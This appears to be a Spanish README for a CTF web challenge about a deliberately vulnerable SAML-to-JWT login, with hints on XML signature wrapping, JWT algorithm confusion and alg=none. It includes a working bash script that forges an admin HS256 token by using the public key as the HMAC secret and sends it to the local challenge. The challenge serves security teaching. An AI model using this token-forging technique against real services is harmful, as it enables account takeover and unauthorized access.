# SAML Hydra: **Assertion of Many Heads** 🐍

> **Categoría:** Web
>
> **Dificultad:** Alto
>
> **Autor:** Dennis Juilland
>
> **Lema:** *“Many heads sign, but only one truth escapes.”*

Una aplicación web que delega autenticación a SAML está **mal configurada** y hace un  **pipeline inseguro** : `XML (SAML) → JSON → JWT`. Tu objetivo es **asumir la identidad de admin** y leer la flag en el panel.

---

## 🎯 Objetivo

Autenticarte como usuario **admin** y acceder a `/dashboard` para obtener la  **FLAG** .

---

## 🧭 Endpoints de interés

* `/` — Portada con historia del reto.
* `/about` — Créditos y pista temática.
* `/dashboard` — Panel del usuario (requiere cookie `hydra_session`).
* `/sso/acs` — **Assertion Consumer Service** (recibe `POST` con `SAMLResponse`).
* `/static/certs/sp_public.pem` — Clave pública del **Service Provider** (SP).

> El servicio escucha en `:80` (mapeado a `8104/tcp` en el host del reto).

---

## 🔧 Puesta en marcha (organizador)

Con Docker instalado:

<pre class="overflow-visible!" data-start="1091" data-end="1290"><div class="contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary"><div class="sticky top-9"><div class="absolute end-0 bottom-0 flex h-9 items-center pe-2"><div class="bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs"></div></div></div><div class="overflow-y-auto p-4" dir="ltr"><code class="whitespace-pre! language-bash"><span><span># Construir y levantar</span><span>
./run.sh up
</span><span># → http://127.0.0.1:8104</span><span>

</span><span># Logs</span><span>
docker logs -f saml-hydra

</span><span># Reset limpio</span><span>
./run.sh reset

</span><span># Entrar al contenedor (debug)</span><span>
docker </span><span>exec</span><span> -it saml-hydra sh
</span></span></code></div></div></pre>

**Estructura del proyecto** (resumen):

<pre class="overflow-visible!" data-start="1332" data-end="1820"><div class="contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary"><div class="sticky top-9"><div class="absolute end-0 bottom-0 flex h-9 items-center pe-2"><div class="bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs"></div></div></div><div class="overflow-y-auto p-4" dir="ltr"><code class="whitespace-pre!"><span><span>saml-hydra/
├─ app.js                </span><span># servidor Node/Express (vulnerable a propósito)</span><span>
├─ Dockerfile
├─ run.sh
├─ package.json
├─ </span><span>public</span><span>/
│  ├─ hydra.svg
│  ├─ hero.svg
│  └─ certs/             </span><span># se sirve como /static/certs/</span><span>
├─ views/                # </span><span>EJS</span><span> (usa ejs-mate)
│  ├─ layout.ejs
│  ├─ index.ejs
│  ├─ dashboard.ejs
│  ├─ about.ejs
│  └─ partials/head.ejs
└─ certs/                </span><span># claves del SP (se generan en build si no existen)</span><span>
   ├─ sp_private.pem
   └─ sp_public.pem
</span></span></code></div></div></pre>

---

## 🧪 Cómo jugar (participante)

### 1) Analiza el flujo

* El login real no existe: la app espera un `POST` a `/sso/acs` con campos:
  * `SAMLResponse` (Base64 del XML SAML)
  * `alg` (opcional; su valor influye en cómo se firma el **JWT** de sesión)
* Tras procesar, el servidor emite cookie `hydra_session` y redirige a `/dashboard`.

### 2) Pistas de investigación

* Revisa el **certificado público** del SP: `GET /static/certs/sp_public.pem`.
* Observa que el servidor puede aceptar **diferentes `alg`** al emitir/verificar JWT.
* El parser SAML puede tratar **prefijos de namespace** (`saml:`/`samlp:`) de forma laxa.
* ¿Qué pasa si hay **dos `<Assertion>`** y firma en una parte del documento?

### 3) Lo que debes lograr

* Forzar que el **payload** final (JWT en `hydra_session`) tenga `role=admin`.
* Una vez con cookie válida, visita `/dashboard` y  **lee la flag** .

---

## 🧩 Hints (progresivos, sin spoilers directos)

1. **XML → JSON:** Si el servidor convierte XML SAML a JSON de forma laxa, el orden y los **prefijos de namespace** pueden afectar qué assertion se toma.
2. **XSW (XML Signature Wrapping):** Firma que “parece” válida, pero la app **no ata la firma** a la assertion que realmente usa. ¿Qué pasa si envías  **dos assertions** ?
3. **Confusión de algoritmos en JWT:** ¿Qué ocurre si el servidor acepta `alg=HS256` y “accidentalmente” trata la **clave pública** como  **secreto HMAC** ?
4. **Alg = none:** Algunas implementaciones aceptan tokens **sin firma** si `alg=none`. ¿Te sirve como plan B?

> Si te atoras: *“Many heads sign, but only one truth escapes.”*

---

## ✅ Criterios de éxito

* La cookie `hydra_session` que recibes/forjas contiene un JWT con `role: "admin"`.
* Accedes a `/dashboard` y la web te muestra la  **FLAG** .

---

## 🛡️ Reglas del evento

* **No** ataques la infraestructura del CTF (host, Docker, otros contenedores).
* El reto es **puramente lógico** (no fuerza bruta ni DoS).
* Comparte sólo la  **flag** , no el exploit completo durante la competencia.

---

## 🧰 Utilidades útiles

### Base64 (sin saltos) de un XML en Linux

<pre class="overflow-visible!" data-start="3909" data-end="3940"><div class="contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary"><div class="sticky top-9"><div class="absolute end-0 bottom-0 flex h-9 items-center pe-2"><div class="bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs"></div></div></div><div class="overflow-y-auto p-4" dir="ltr"><code class="whitespace-pre! language-bash"><span><span>base64</span><span> -w0 saml.xml
</span></span></code></div></div></pre>

En macOS:

<pre class="overflow-visible!" data-start="3951" data-end="3991"><div class="contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary"><div class="sticky top-9"><div class="absolute end-0 bottom-0 flex h-9 items-center pe-2"><div class="bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs"></div></div></div><div class="overflow-y-auto p-4" dir="ltr"><code class="whitespace-pre! language-bash"><span><span>base64</span><span> saml.xml | </span><span>tr</span><span> -d </span><span>'\n'</span><span>
</span></span></code></div></div></pre>

### Construir un JWT HS256 manual en bash

<pre class="overflow-visible!" data-start="4035" data-end="4503"><div class="contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary"><div class="sticky top-9"><div class="absolute end-0 bottom-0 flex h-9 items-center pe-2"><div class="bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs"></div></div></div><div class="overflow-y-auto p-4" dir="ltr"><code class="whitespace-pre! language-bash"><span><span>b64url</span><span>() { openssl </span><span>base64</span><span> -A | </span><span>tr</span><span></span><span>'+/'</span><span></span><span>'-_'</span><span> | </span><span>tr</span><span> -d </span><span>'='</span><span>; }
HDR=</span><span>'{"alg":"HS256","typ":"JWT"}'</span><span>
PL=</span><span>'{"sub":"admin@hydra.local","role":"admin","iat":'</span><span>$(</span><span>date</span><span> +%s)</span><span>'}'</span><span>

H=$(</span><span>printf</span><span> %s </span><span>"$HDR</span><span>" | b64url)
P=$(</span><span>printf</span><span> %s </span><span>"$PL</span><span>"  | b64url)
PUB=$(curl -fsS http://127.0.0.1:8104/static/certs/sp_public.pem)
S=$(</span><span>printf</span><span> %s </span><span>"$H</span><span>.</span><span>$P</span><span>" | openssl dgst -sha256 -hmac </span><span>"$PUB</span><span>" -binary | b64url)
TOKEN=</span><span>"$H</span><span>.</span><span>$P</span><span>.</span><span>$S</span><span>"
curl -s -H </span><span>"Cookie: hydra_session=$TOKEN</span><span>" http://127.0.0.1:8104/dashboard
</span></span></code></div></div></pre>

---

## 🐛 Troubleshooting

* **No veo la cookie tras /sso/acs** : usa `curl -i` o un proxy (Burp) para visualizar `Set-Cookie`.
* **El XML se rompe** : cuando envíes `SAMLResponse` usa `--data-urlencode` para preservar `+ / =`.
* **Sigue como “user”** : revisa el **orden** de las `<Assertion>` y los **prefijos** `saml:` en atributos.
* **CORS/cookies** : el reto usa `SameSite=Lax`; si haces pruebas desde navegador, preferible hacerlo todo en la misma pestaña/origen.

---

## 🧠 Objetivos de aprendizaje

* Entender **XSW** y por qué validar sólo la presencia de `<Signature>` es inseguro.
* Reconocer **confusión de algoritmos** en JWT (mezclar **clave pública** con  **secreto HMAC** ).
* Tratar con **namespaces XML** y su impacto al serializar a JSON.

---

## 🗂️ Material para entrega (jugadores)

* **Flag** : cadena exacta encontrada en `/dashboard`.
* **Breve write-up** (máx. 1 página):
  * Cómo manipulaste `SAMLResponse`.
  * Cómo obtuviste/forjaste `hydra_session`.
  * Por qué funciona (1–2 párrafos).

---

## ⚠️ Nota para organizadores

Este README **no** contiene la solución explícita.

Si quieres incluir un **SOLVER.md** con el exploit de referencia (XSW + alg confusion) o un script `solve.py` para validación automática, dímelo y te lo preparo como archivo aparte.

---

¡Suerte! Y recuerda:  **muchas cabezas firman, pero sólo una verdad escapa** . 🐍
